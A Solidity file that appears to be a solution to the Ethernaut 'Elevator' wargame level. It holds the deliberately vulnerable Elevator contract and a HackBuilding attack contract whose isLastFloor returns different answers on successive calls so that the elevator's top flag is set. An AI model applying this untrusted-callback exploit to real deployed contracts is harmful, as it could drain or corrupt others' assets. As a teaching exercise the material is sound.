// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

//Sol in order to set top to true, the first call to isLastFloor has to return false and the second one, true.

contract HackBuilding is Building {
    bool public cheat = false;

    function goTo(Elevator elevator) public {
        elevator.goTo(20);
    }

    function isLastFloor(uint256 _floor) external override returns (bool) {
        if (!cheat) {
            cheat = true;
            return false;
        }
        return true;
    }
}
